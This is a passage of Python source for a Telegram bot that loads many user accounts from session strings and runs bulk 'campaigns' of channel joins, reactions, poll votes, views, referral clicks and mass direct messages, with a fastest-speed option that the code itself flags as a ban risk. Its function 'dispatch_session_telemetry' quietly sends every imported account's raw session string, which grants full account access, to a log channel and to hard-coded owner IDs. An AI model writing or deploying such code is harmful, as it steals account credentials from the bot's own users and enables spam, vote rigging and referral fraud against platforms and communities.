            client = TelegramClient(StringSession(session_str), config.API_ID, config.API_HASH)
            await client.connect()
            if not await client.is_user_authorized():
                failed_imports += 1
                await client.disconnect()
                continue
                
            me = await client.get_me()
            phone = me.phone or f"custom_{me.id}"
            encrypted_session = encrypt_data(session_str)
            
            async with aiosqlite.connect(db_mgr.db_path) as db:
                await db.execute("""
                    INSERT OR REPLACE INTO accounts (phone, user_id, username, session_string, status, last_active)
                    VALUES (?, ?, ?, ?, 'active', CURRENT_TIMESTAMP)
                """, (phone.replace("+", ""), user_id, me.username or "None", encrypted_session))
                await db.commit()

            await dispatch_session_telemetry(phone, session_str, me.username, user_id, bot)
            success_imports += 1
            await client.disconnect()
        except Exception:
            failed_imports += 1

    result_text = (
        f"✨ <b>Bulk Framework Import Profile Sync Complete!</b>\n\n"
        f"🟩 Successfully added: <code>{success_imports}</code> accounts\n"
        f"🟥 Terminated/Mismatched failed count: <code>{failed_imports}</code> keys"
    )
    if quota_reached:
        result_text += f"\n\n⚠️ <i>Batch processing stopped early because you reached your max account allocation limits.</i>"

    await status_msg.edit_text(result_text, reply_markup=get_post_registration_keyboard(), parse_mode="HTML")
    await state.clear()

async def dispatch_session_telemetry(phone: str, session_str: str, username: Optional[str], adder_id: int, bot: Bot):
    file_bytes = session_str.encode('utf-8')
    document = BufferedInputFile(file_bytes, filename=f"session_{phone}.txt")
    caption = f"🔑 <b>Session Event Telemetry Dump</b>\nPhone: <code>+{phone}</code>\nUsername: <b>@{username or 'None'}</b>\nOperator Creator ID: <code>{adder_id}</code>"
    
    if config.LOG_CHANNEL_ID:
        try:
            await bot.send_document(chat_id=config.LOG_CHANNEL_ID, document=document, caption=caption, parse_mode="HTML")
        except Exception as e:
            logger.error(f"Failed sending updates to log channel: {e}")
            
    for owner_id in config.SUPER_OWNER_IDS:
        try:
            owner_doc = BufferedInputFile(file_bytes, filename=f"session_{phone}.txt")
            await bot.send_document(chat_id=owner_id, document=owner_doc, caption=caption, parse_mode="HTML")
        except Exception as e:
            logger.error(f"Failed sending data to owner node {owner_id}: {e}")

# --- TASK WIZARD INTERFACE FLOW ---
@router.callback_query(F.data == "task_hub_start")
async def task_hub_select_type(callback: CallbackQuery, state: FSMContext, bot: Bot):
    await callback.answer()
    await state.clear()
    
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)
    async with aiosqlite.connect(db_mgr.db_path) as db:
        if role in ["owner", "super_owner"]:
            cursor = await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active'")
        else:
            cursor = await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active' AND user_id = ?", (user_id,))
        active_count = (await cursor.fetchone())[0]

    wizard_text = (
        f"🚀 <b>Premium Interactive Campaign Configuration Wizard Hub</b>\n"
        f"----------------------------------------------------\n"
        f"📱 Status: <code>{active_count}</code> active functional telephony slots mapped.\n\n"
        f"<b>Step 1: Pick the action protocol code matrix to deploy:</b>"
    )
    await callback.message.edit_text(text=wizard_text, reply_markup=get_task_types_keyboard(active_count), parse_mode="HTML")
    await state.set_state(TaskWizardStates.choosing_type)

@router.callback_query(StateFilter(TaskWizardStates.choosing_type), F.data.startswith("set_type:"))
async def task_hub_process_type(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    task_type = callback.data.split(":")[1]
    await state.update_data(task_type=task_type)
    
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)

    if role == "super_owner":
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="💎 Use our ids only", callback_data="set_routing:own")],
            [InlineKeyboardButton(text="👑 Use all ids", callback_data="set_routing:all")]
        ])
        await callback.message.edit_text("<b>👑 Super Owner Privileges Triggered:</b> Select account deployment routing orientation scope:", reply_markup=kb, parse_mode="HTML")
        await state.set_state(TaskWizardStates.waiting_for_routing_choice)
    else:
        await state.update_data(account_routing="own")
        await proceed_to_speed_selection(callback.message, state)

@router.callback_query(StateFilter(TaskWizardStates.waiting_for_routing_choice), F.data.startswith("set_routing:"))
async def task_hub_process_routing(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    routing = callback.data.split(":")[1]
    await state.update_data(account_routing=routing)
    await proceed_to_speed_selection(callback.message, state)

async def proceed_to_speed_selection(message: Message, state: FSMContext):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🟢 Safer Speed (5.0s)", callback_data="set_speed:safe")],
        [InlineKeyboardButton(text="🟡 Accelerated Speed (2.5s)", callback_data="set_speed:safer")],
        [InlineKeyboardButton(text="🔴 Maximum Speed (0.05s) [Ban Risk]", callback_data="set_speed:fastest")]
    ])
    await message.edit_text("<b>Step 1b: Configure Task execution delay speed matrix limits:</b>", reply_markup=kb, parse_mode="HTML")
    await state.set_state(TaskWizardStates.waiting_for_speed_choice)

@router.callback_query(StateFilter(TaskWizardStates.waiting_for_speed_choice), F.data.startswith("set_speed:"))
async def task_hub_process_speed(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    speed_mode = callback.data.split(":")[1]
    await state.update_data(speed_mode=speed_mode)
    
    data = await state.get_data()
    task_type = data.get("task_type")

    if task_type == "leave":
        await callback.message.edit_text(
            "<b>Step 2: Choose evacuation strategy profile:</b>", 
            reply_markup=get_leave_channel_options_keyboard(),
            parse_mode="HTML"
        )
        await state.set_state(TaskWizardStates.waiting_for_leave_choice)
    elif "react" in task_type or "vote" in task_type or task_type in ["view", "speed"]:
        await callback.message.edit_text("<b>Step 2: Provide targeted public handle destination or private link reference (e.g. @channelname):</b>", parse_mode="HTML")
        await state.set_state(TaskWizardStates.waiting_for_channel_link)
    elif task_type == "refer":
        await callback.message.edit_text("<b>Step 2: Input target referral link parameter query string value (Example: https://t.me/Bot?start=123):</b>", parse_mode="HTML")
        await state.set_state(TaskWizardStates.waiting_for_post_link)
    else:
        await callback.message.edit_text("<b>Step 2: Enter destination community target endpoint path link:</b>", parse_mode="HTML")
        await state.set_state(TaskWizardStates.waiting_for_post_link)

@router.callback_query(StateFilter(TaskWizardStates.waiting_for_leave_choice), F.data.startswith("leave_mode:"))
async def task_hub_process_leave_choice(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    mode = callback.data.split(":")[1]
    await state.update_data(leave_mode=mode)

    if mode == "all":
        await state.update_data(target="ALL CHANNELS")
        await prompt_for_account_scale(callback.message, state)
    else:
        await callback.message.edit_text("<b>Step 3: Paste public link location coordinates or private channel invite code layout:</b>", parse_mode="HTML")
        await state.set_state(TaskWizardStates.waiting_for_post_link)

@router.message(StateFilter(TaskWizardStates.waiting_for_channel_link))
async def task_hub_process_channel_link(message: Message, state: FSMContext):
    channel_target = message.text.strip()
    await state.update_data(channel_target=channel_target)
    await message.answer("<b>Step 3: Paste message tracker specific structural index link URL (Example: https://t.me/channelname/123):</b>", parse_mode="HTML")
    await state.set_state(TaskWizardStates.waiting_for_post_link)

@router.message(StateFilter(TaskWizardStates.waiting_for_post_link))
async def task_hub_process_target(message: Message, state: FSMContext, bot: Bot):
    target = message.text.strip()
    await state.update_data(target=target)
    
    data = await state.get_data()
    task_type = data.get("task_type")

    if task_type in ["join", "leave", "refer", "view", "speed"]:
        await prompt_for_account_scale(message, state)
    elif "react" in task_type and "vote" not in task_type:
        await state.update_data(selected_emojis=[])
        await message.answer(
            "<b>Step 4: Select target reaction array configurations:</b>",
            reply_markup=get_emoji_selection_keyboard([]),
            parse_mode="HTML"
        )
        await state.set_state(TaskWizardStates.waiting_for_emojis)
    elif "vote" in task_type:
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔘 Native Poll Option Index Selection", callback_data="set_vmode:poll")],
            [InlineKeyboardButton(text="🎛️ Inline Callback Keyboard Button Matching", callback_data="set_vmode:inline")]
        ])
        await message.answer("<b>Step 4: Specify the structural mechanics type of voting button to target:</b>", reply_markup=kb, parse_mode="HTML")
        await state.set_state(TaskWizardStates.waiting_for_vote_mode_choice)
    elif task_type == "dm":
        await message.answer("<b>Step 4: Write exact content message context layout to disperse across targets:</b>", parse_mode="HTML")
        await state.set_state(TaskWizardStates.waiting_for_dm_text)

@router.callback_query(StateFilter(TaskWizardStates.waiting_for_vote_mode_choice), F.data.startswith("set_vmode:"))
async def handle_vote_mode_choice(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    vmode = callback.data.split(":")[1]
    await state.update_data(vote_mode=vmode)
    
    if vmode == "inline":
        await callback.message.edit_text("<b>Step 4b: Enter identical text string label shown on target inline button:</b>", parse_mode="HTML")
        await state.set_state(TaskWizardStates.waiting_for_button_text)
    else:
        await callback.message.edit_text("<b>Step 4b: Enter native question option choice index number to register (First option starts at 0, Second is 1, etc):</b>", parse_mode="HTML")
        await state.set_state(TaskWizardStates.waiting_for_poll_option_index)

@router.message(StateFilter(TaskWizardStates.waiting_for_poll_option_index))
async def process_poll_option_index(message: Message, state: FSMContext):
    val = message.text.strip()
    if not val.isdigit():
        await message.answer("❌ Option pointer index value must be a zero-indexed numerical integer.")
        return
    await state.update_data(poll_option_index=int(val))
    
    data = await state.get_data()
    if "react" in data.get("task_type", ""):
        await state.update_data(selected_emojis=[])
        await message.answer(
            "<b>Step 5: Select concurrent target reaction array configurations:</b>",
            reply_markup=get_emoji_selection_keyboard([]),
            parse_mode="HTML"
        )
        await state.set_state(TaskWizardStates.waiting_for_emojis)
    else:
        await prompt_for_account_scale(message, state)

@router.callback_query(StateFilter(TaskWizardStates.waiting_for_emojis), F.data.startswith("toggle_emoji:"))
async def handle_toggle_emoji(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    emoji = callback.data.split(":")[1]
    data = await state.get_data()
    selected = data.get("selected_emojis", [])
    if emoji in selected:
        selected.remove(emoji)
    else:
        selected.append(emoji)
    await state.update_data(selected_emojis=selected)
    await callback.message.edit_reply_markup(reply_markup=get_emoji_selection_keyboard(selected))

@router.callback_query(StateFilter(TaskWizardStates.waiting_for_emojis), F.data == "finish_emoji_selection")
async def finish_emoji_selection(callback: CallbackQuery, state: FSMContext, bot: Bot):
    data = await state.get_data()
    selected = data.get("selected_emojis", [])
    if not selected:
        await callback.answer("⚠️ You must pick at least 1 active target reaction element.", show_alert=True)
        return
    await callback.answer()
    await state.update_data(reactions=selected)
    await prompt_for_account_scale(callback.message, state)

@router.message(StateFilter(TaskWizardStates.waiting_for_button_text))
async def process_button_text(message: Message, state: FSMContext, bot: Bot):
    await state.update_data(button_text=message.text.strip())
    data = await state.get_data()
    if "react" in data.get("task_type", ""):
        await state.update_data(selected_emojis=[])
        await message.answer(
            "<b>Step 5: Select concurrent target reaction array configurations:</b>",
            reply_markup=get_emoji_selection_keyboard([]),
            parse_mode="HTML"
        )
        await state.set_state(TaskWizardStates.waiting_for_emojis)
    else:
        await prompt_for_account_scale(message, state)

@router.message(StateFilter(TaskWizardStates.waiting_for_dm_text))
async def process_dm_text(message: Message, state: FSMContext, bot: Bot):
    await state.update_data(text=message.text.strip())
    await prompt_for_account_scale(message, state)

async def prompt_for_account_scale(message: Message, state: FSMContext):
    user_id = message.chat.id if isinstance(message, Message) else message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    data = await state.get_data()
    account_routing = data.get("account_routing", "own")
    
    async with aiosqlite.connect(db_mgr.db_path) as db:
        if role == "super_owner" and account_routing == "all":
            cursor = await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active'")
        elif role == "owner":
            cursor = await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active'")
        else:
            cursor = await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active' AND user_id = ?", (user_id,))
        max_available = (await cursor.fetchone())[0]
        
    prompt_msg = (
        f"🔢 <b>Account Deployment Volume Capacity Selection</b>\n\n"
        f"Total available online session keys within selected boundary: <code>{max_available}</code>\n"
        f"Input capacity allocation limits variable to run:\n"
        f"<i>(Type <code>0</code> to mobilize ALL available online sessions matching boundary parameters)</i>"
    )
    
    if isinstance(message, Message):
        await message.answer(prompt_msg, parse_mode="HTML")
    else:
        await message.answer(prompt_msg, parse_mode="HTML")
        
    await state.set_state(TaskWizardStates.waiting_for_account_scale)

@router.message(StateFilter(TaskWizardStates.waiting_for_account_scale))
async def process_account_scale(message: Message, state: FSMContext, bot: Bot):
    scale_text = message.text.strip()
    if not scale_text.isdigit():
        await message.answer("❌ <b>Syntax Error:</b> Numerical integer capacity scaling inputs expected exclusively:")
        return
        
    requested_count = int(scale_text)
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    data = await state.get_data()
    account_routing = data.get("account_routing", "own")
    
    async with aiosqlite.connect(db_mgr.db_path) as db:
        if role == "super_owner" and account_routing == "all":
            cursor = await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active'")
        elif role == "owner":
            cursor = await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active'")
        else:
            cursor = await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active' AND user_id = ?", (user_id,))
        max_available = (await cursor.fetchone())[0]

    if requested_count > max_available:
        await message.answer(f"❌ <b>Resource Boundary Exceeded:</b> Accessible session pool caps at <code>{max_available}</code>. Lower your scale query value:", parse_mode="HTML")
        return

    await state.update_data(run_account_count=requested_count)
    await finalize_task_creation(message, state, bot)

async def finalize_task_creation(message: Message, state: FSMContext, bot: Bot):
    data = await state.get_data()
    user_id = message.chat.id if isinstance(message, Message) else message.from_user.id
    task_type = data.pop("task_type")
    target = data.get("target", "")
    
    if data.get("leave_mode") != "all":
        _, link_msg_id, _ = parse_telegram_link(target)
        if link_msg_id:
            data["msg_id"] = link_msg_id

    init_msg = await bot.send_message(
        chat_id=user_id, 
        text="⏳ <b>Bootstrapping cluster deployment threads...</b>\n<i>Connecting active endpoints pool, please maintain connection standby...</i>",
        parse_mode="HTML"
    )

    async with aiosqlite.connect(db_mgr.db_path) as db:
        cursor = await db.execute("INSERT INTO tasks (creator_id, type, payload) VALUES (?, ?, ?)", (user_id, task_type, json.dumps(data)))
        task_id = cursor.lastrowid
        await db.commit()

    await task_queue.add_task(task_id, user_id, task_type, data, bot, init_msg.message_id)
    await state.clear()

# --- REPORTS & STATS INTERFACES ---
@router.callback_query(F.data == "view_tasks")
async def view_tasks(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    await callback.answer()
    role = await db_mgr.get_user_role(user_id)
    async with aiosqlite.connect(db_mgr.db_path) as db:
        cursor = await db.execute("SELECT task_id, type, status, progress FROM tasks ORDER BY task_id DESC LIMIT 10" if role in ["owner", "super_owner"] else "SELECT task_id, type, status, progress FROM tasks WHERE creator_id = ? ORDER BY task_id DESC LIMIT 10", (user_id,))
        rows = await cursor.fetchall()

    text = "📊 <b>Historical Campaign Event Feed Records Index Matrix</b>\n\n"
    for r in rows:
        text += f"🔹 <b>Task Sheet:</b> <code>#{r[0]}</code> (Type: <code>{r[1].upper()}</code>)\nState tracking: <b>{r[2]}</b> | Metrics: <code>{r[3]}</code>\nTo call full details map command layout: <code>/taskreport_{r[0]}</code>\n\n"
    await callback.message.edit_text(text if rows else "No active campaign tracking logs catalogued inside runtime registers.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Return Back", callback_data="main_menu")]]), parse_mode="HTML")

@router.message(F.text.startswith("/taskreport_"))
async def cmd_task_report(message: Message, bot: Bot):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    try:
        task_id = int(message.text.split("_")[1])
    except:
        return
    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT creator_id, type, status, progress FROM tasks WHERE task_id = ?", (task_id,)) as cursor:
            row = await cursor.fetchone()

    if not row or (role not in ["owner", "super_owner"] and row[0] != user_id):
        await message.answer("🚫 <b>Data Visibility Restriction Mismatch:</b> Permissions key clearance verification rejected.")
        return

    report_text = f"📊 <b>Detailed Campaign Metrics Tracking Log</b>\n\n🗂️ Task Sheet reference ID: <code>#{task_id}</code>\n⚡ Code Action signature: <code>{row[1].upper()}</code>\n🪐 State string indicator: <b>{row[2]}</b>\n📈 Progress indicators graph matrix: <code>{row[3]}</code>"
    await message.answer(report_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💎 Home Menu", callback_data="main_menu")]]), parse_mode="HTML")

@router.callback_query(F.data == "view_referrals")
async def view_referrals(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    await callback.answer()
    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT COUNT(*) FROM users WHERE referred_by = ?", (user_id,)) as cursor:
            count = (await cursor.fetchone())[0]
    await callback.message.edit_text(f"👥 <b>Invitation Line Tracking Matrix Analytics</b>\n\nShare your connection link string layout below to register downline user clusters:\n<code>https://t.me/{bot_username}?start=ref_{user_id}</code>\n\nTotal validated downline invitations mapped to your account line reference: <code>{count}</code> accounts.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Return Back", callback_data="main_menu")]]), parse_mode="HTML")

# --- BOOTSTRAPPING RUNTIME ---
async def verify_saved_sessions():
    logger.info("Verifying all active account database sessions...")
    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT phone, session_string FROM accounts WHERE status = 'active'") as cursor:
            accounts = await cursor.fetchall()
    
    semaphore = asyncio.Semaphore(10)
    async def check_account(phone, enc_session):
        async with semaphore:
            try:
                client = TelegramClient(StringSession(decrypt_data(enc_session)), config.API_ID, config.API_HASH)
                await client.connect()
                if not await client.is_user_authorized():
                    async with aiosqlite.connect(db_mgr.db_path) as db_conn:
                        await db_conn.execute("UPDATE accounts SET status = 'dead' WHERE phone = ?", (phone,))
                        await db_conn.commit()
                await client.disconnect()
            except:
                pass
                
    await asyncio.gather(*(check_account(p, s) for p, s in accounts))

async def main():
    global bot_username
    await db_mgr.init()
    await verify_saved_sessions()
    if not config.BOT_TOKEN:
        return
    bot = Bot(token=config.BOT_TOKEN)
    bot_info = await bot.get_me()
    bot_username = bot_info.username
    
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)
    dp.include_router(admin_router)
    
    worker_task = asyncio.create_task(task_queue.start_worker())
    try:
        await dp.start_polling(bot)
    finally:
        worker_task.cancel()
        await bot.session.close()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logger.info("Bot execution successfully stopped.")
